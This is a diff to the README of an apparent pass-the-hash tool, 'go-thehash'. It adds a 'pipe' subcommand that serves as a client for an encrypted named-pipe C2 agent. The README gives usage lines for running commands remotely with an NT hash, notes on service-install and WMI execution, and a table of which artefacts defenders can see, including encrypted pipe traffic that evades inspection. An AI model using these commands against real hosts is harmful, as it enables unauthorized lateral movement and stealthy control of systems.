@@ -64,6 +64,24 @@ go-thehash enum sessions <target> <domain> <user> <nt-hash>
 go-thehash enum users    <target> <domain> <user> <nt-hash> [netbios-name]
 ```
 
+### Named-pipe command execution
+
+```
+go-thehash pipe <target> <domain> <user> <nt-hash> <pipe-name> <command>
+```
+
+Operator-side client for `smbpipe-agent.exe` ([`../smbpipe-agent/`](../smbpipe-agent/)): opens the remote named pipe over `IPC$`, performs the encrypted-channel handshake (16-byte salt → static X25519 ECDH + HKDF-SHA256 → per-connection AES-256-GCM keys), sends one command, prints the framed output. Retries up to 2 s when the server reports `STATUS_PIPE_BUSY`. The agent must already be listening on the target.
+
+| | notes |
+|---|---|
+| Transport | SMB2 `IPC$` named pipe (tcp/445) — rides inside an ordinary SMB session |
+| Artefact | No service install, no new process creation primitive beyond what the command itself runs |
+| Requires | Port 445; local admin on target (agent DACL allows BA/SY only) |
+
+Implementation notes:
+- Byte-mode pipe with length-prefix framing, not `FSCTL_PIPE_TRANSCEIVE` — that IOCTL requires a message-mode server pipe, and separate `WriteFile` + `ReadFile` is correct against the byte-mode agent.
+- SMB2 `ReadFile` on a named pipe ignores the offset parameter (data comes from the pipe buffer sequentially); passing `0` is correct.
+
 ---
 
 ## Arguments
@@ -80,6 +98,7 @@ go-thehash enum users    <target> <domain> <user> <nt-hash> [netbios-name]
 | `pattern` | File glob for `ls` — defaults to `*` |
 | `local-path` | Local file path for `put` / `get` |
 | `command` | Full command string for `exec` / `exec-wmi` |
+| `pipe-name` | Named pipe name without the `\\.\pipe\` prefix (e.g. `oraclexa`) — must match the agent's pipe |
 | `netbios-name` | NetBIOS computer name for `enum users`; auto-detected if omitted |
 
 ---
@@ -105,6 +124,9 @@ go-thehash.exe exec TARGET . Administrator aad3b435b51404eeaad3b435b51404ee "%CO
 # Execute a command via WMI (no service artefact)
 go-thehash.exe exec-wmi TARGET . Administrator aad3b435b51404eeaad3b435b51404ee "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
 
+# Execute a command through the encrypted pipe channel (smbpipe-agent must be listening on TARGET)
+go-thehash.exe pipe TARGET . Administrator aad3b435b51404eeaad3b435b51404ee oraclexa "whoami"
+
 # Enumerate shares
 go-thehash.exe enum shares   TARGET DOMAIN Administrator aad3b435b51404eeaad3b435b51404ee
 
@@ -125,6 +147,7 @@ go-thehash.exe enum users    TARGET DOMAIN Administrator aad3b435b51404eeaad3b43
 | Event ID 7045 (Service install) | `exec` only — random 12-char service name, deleted immediately after launch |
 | SMB2 `TreeConnect` to admin share | Visible in network capture for file transfer subcommands |
 | SMB2 `IPC$\svcctl` DCE/RPC | Visible in network capture for `exec` |
+| SMB2 pipe open + read/write on custom pipe name | `pipe` subcommand — traffic is encrypted after handshake; only the salt and frame lengths are visible on the wire |
 
 ---
 
@@ -132,11 +155,19 @@ go-thehash.exe enum users    TARGET DOMAIN Administrator aad3b435b51404eeaad3b43
 
 ```
 go-thehash/
-├── main.go      ← CLI dispatch and all functions
-├── go.mod       ← module declaration, go 1.24, replace → ./go-smb
+├── main.go                    ← CLI dispatch only (usage + switch)
+├── internal/
+│   ├── session/               ← PtH SMB2 session setup (NTLMv2)
+│   ├── fileops/               ← put / get / del / ls
+│   ├── remoteexec/            ← exec (MS-SCMR) / exec-wmi (DCOM)
+│   ├── pipechan/              ← pipe subcommand: encrypted channel client (mirror of smbpipe-agent internal/securechan)
+│   └── enum/                  ← enum shares / sessions / users (MS-SRVS, MS-SAMR)
+├── go.mod                     ← module declaration, go 1.24, replace → ./go-smb
 ├── go.sum
-└── go-smb/      ← jfjallid/go-smb vendored locally
+└── go-smb/                    ← jfjallid/go-smb vendored locally
 ```
+
+> `internal/pipechan` duplicates the wire protocol implemented in `../smbpipe-agent/internal/securechan/`. A frame-layout change must be applied to both modules in the same change — see the "Mirror drift" section of the agent README for the incident that motivates this rule.
 
 ---
 
@@ -153,5 +184,6 @@ go-thehash/
 | Share enumeration | `Invoke-SMBEnum -Action Share` | `enum shares` |
 | Session enumeration | `Invoke-SMBEnum -Action NetSession` | `enum sessions` |
 | User enumeration | `Invoke-SMBEnum -Action User` | `enum users` |
+| Named-pipe C2 client | — (no counterpart) | `pipe` |
 | SMB versions | SMB1 + SMB2.1 | SMB2 only |
 | Hash input format | `LM:NTLM` or `NTLM` (32/65 chars) | NT hash, 32-char hex only |
